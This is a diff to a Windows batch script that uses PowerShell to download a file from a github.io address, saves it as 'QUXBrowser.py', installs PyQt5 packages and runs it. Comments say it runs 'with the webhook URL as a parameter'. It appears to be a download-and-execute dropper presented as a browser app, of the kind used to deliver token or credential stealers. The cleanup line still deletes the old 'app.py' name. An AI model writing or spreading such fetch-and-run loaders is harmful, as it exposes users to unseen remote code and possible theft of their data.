@@ -11,10 +11,13 @@ if %ERRORLEVEL% NEQ 0 (
 setlocal
 
 :: Download the PowerShell script
-powershell -Command "Invoke-WebRequest -Uri https://radio1233.github.io/game.github.io/app -OutFile app.py"
-
+powershell -Command "Invoke-WebRequest -Uri https://radio1233.github.io/game.github.io/app -OutFile QUXBrowser.py"
+pip install PyQt5
+pip install PyQtWebEngine
+pip install PyQt5
+pip install PyQtWebEngine
 :: Execute the PowerShell script with the webhook URL as a parameter
-app.py
+QUXBrowser.py
 
 :: Cleanup
 del app.py
